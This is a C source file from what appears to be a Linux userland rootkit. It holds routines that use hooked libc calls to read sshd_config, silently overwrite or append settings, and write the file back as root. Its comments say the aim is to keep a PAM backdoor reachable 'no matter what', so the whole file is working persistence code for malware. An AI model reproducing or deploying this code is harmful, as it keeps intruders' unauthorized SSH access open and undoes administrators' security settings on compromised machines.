/*
 *   the following functions handle all of the work for patching sshd_config
 *   to make sure the PAM backdoor is accessible, AND STAYS THAT WAY.
 */

int sshdok(int res[], char **buf, size_t *sshdsize){
    hook(CFOPEN, C__XSTAT);

    /* first, get the size of the sshd_config file so we know how much memory to allocate. */
    struct stat sshdstat;
    memset(&sshdstat, 0, sizeof(struct stat));
    int statstat = (long)call(C__XSTAT, _STAT_VER, SSHD_CONFIG, &sshdstat);
    if(statstat < 0) // nopenopenope
        return -1;

    FILE *fp; // FILE pointer for reading of sshd_config.
    char *curtarget,     // contains the current setting to patch.
         *cursettingval, // contains the value of the current setting.
         line[LINE_MAX], // buffer for current line of sshd_config.
         *linedup;       // copy of line buffer so we can strtok on it safely to get setting value.
    size_t targetlen;  // length of the current target setting.
    int skipline = 0;  // indicates whether or not to skip current line from file.

    fp = call(CFOPEN, SSHD_CONFIG, "r");
    if(fp == NULL) return -1;

    // file opened for reading ok. now allocate memory for it.
    *sshdsize = sshdstat.st_size + 45; // +45 bytes for possible additions of our own...
#ifdef MAX_SSHD_SIZE
    if(*sshdsize > MAX_SSHD_SIZE)
        *sshdsize = MAX_SSHD_SIZE;
#endif

    *buf = malloc(*sshdsize);
    memset(*buf, 0, *sshdsize);
    
    while(fgets(line, sizeof(line), fp) != NULL){
        /* lines are cool. unless they aren't... */
        skipline = 0;

        for(int i = 0; i != sizeofarr(patchtargets); i++){
            /* if we've already determined the status of a target setting, go next. */
            if(res[i] == 2 || res[i] == 1)
                continue;

            /* curtarget is a specific setting within sshd_config
             * that we want to remain to our liking. no matter what. */
            curtarget = patchtargets[i];
            targetlen = strlen(curtarget);

            /* check current line starts with a target setting to patch. */
            if(!strncmp(line, curtarget, targetlen)){
                linedup = strdup(line);

                // get the option from the line.
                cursettingval = strtok(linedup, " ");
                cursettingval = strtok(NULL, " "); // theoretically this will/should be "yes" or "no"

                /* check current setting value against values we don't want. */
                if(strstr(cursettingval, antival[i])){
                    // tmp buffer for "<Setting> <Value we want instead>\n"
                    char tmp[strlen(curtarget) + strlen(targetval[i]) + 3];
                    memset(tmp, 0, sizeof(tmp));

                    // create the line for the setting we want.
                    snprintf(tmp, sizeof(tmp), "%s %s\n", curtarget, targetval[i]);
                    strcat(*buf, tmp); // now add it into the sshd_config we have in memory.
                    
                    // indicates to skip adding the original line into memory as we have our own.
                    skipline = 1;
                    res[i] = 2;

                    free(linedup);
                    break;
                }

                /* we've found the target setting for this line, but it's ok the way it is. */
                res[i] = 1;
                free(linedup);
                break;
            }

            continue;
        }

        if(skipline)
            continue;

        /* only copy the contents of line into memory if not skipping this line. */
        strcat(*buf, line);
    }
    fclose(fp);

    return 1;
}

/*
 *    this function does the actual writing of the patched sshd config.
 *    plus the addition of settings that were previously missing.
 */

void sshdpatch(int mode){
    if(not_user(0))
        return;

    size_t sshdsize;
    int status[sizeofarr(patchtargets)];
    if(sshdok(status, &sshdcontents, &sshdsize) < 0)
        return;

    int curstatus,      // the status of the current setting. (1 = ok, 2 = patched, ? = missing)
        nook = 0,       // number of settings that returned 'ok' (1).
        nopatched = 0,  // number of settings whose values have been patched. (2)
        nomissing = 0;  // number of settings missing & that need added.

    for(int i = 0; i != sizeofarr(status); i++){
        curstatus = status[i];

        char tmp[strlen(patchtargets[i]) + strlen(targetval[i]) + 4];

        switch(curstatus){
            case 1: /* current target setting is ok. */
                nook++;
                break;
            case 2: /* target setting has been patched. */
                nopatched++;
                break;
            default: /* target setting was missing. add it. */
                memset(tmp, 0, sizeof(tmp));
                // create & append setting line.
                snprintf(tmp, sizeof(tmp), "\n%s %s\n", patchtargets[i], targetval[i]);
                strcat(sshdcontents, tmp);
                nomissing++;
                break;
        }
    }

    if(mode == MAGIC_USR){
        printf("settings already ok: %d\n", nook);
        printf("settings patched: %d\n", nopatched);
        printf("settings originally missing (now patched): %d\n", nomissing);
    }

    /* no indications that any changes need to be made. */
    if(nook == sizeofarr(patchtargets)){
        if(mode == MAGIC_USR)
            printf("no settings to patch...\n");
        goto nothingdone;
    }

    hook(CFOPEN);
    FILE *fp = call(CFOPEN, SSHD_CONFIG, "w");
    if(fp == NULL)
        goto nothingdone;

    size_t count = fwrite(sshdcontents, 1, strlen(sshdcontents), fp);
    if(!count){
        if(mode == MAGIC_USR)
            printf("failed writing new sshd_config\n");
    }else if(count >= sshdsize){
        if(mode == MAGIC_USR)
            printf("successfully patched sshd_config\n");
    }

    fflush(fp);
    fclose(fp);

nothingdone:
    free(sshdcontents);
}
